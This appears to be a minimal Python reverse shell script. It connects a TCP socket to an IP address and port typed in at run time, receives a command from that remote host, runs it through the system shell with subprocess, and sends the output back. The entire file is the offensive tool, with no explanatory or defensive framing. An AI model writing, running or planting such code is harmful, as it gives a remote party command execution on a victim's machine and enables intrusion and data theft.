import socket
import subprocess

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def execute_command(command):
    return subprocess.check_output(command,shell = True)

def Connection(Lip,Lport):
    connection.connect((Lip, Lport))
    connected()

def connected():
    command = connection .recv(1024)
    result = execute_command(command)
    connection.send(result)
    connection.close()

def main():
    Lip = input("Enter the ip")
    Lport = int(input("Enter the port"))
    Connection(Lip, Lport)


if __name__ == "__main__":
    main()

connection.close()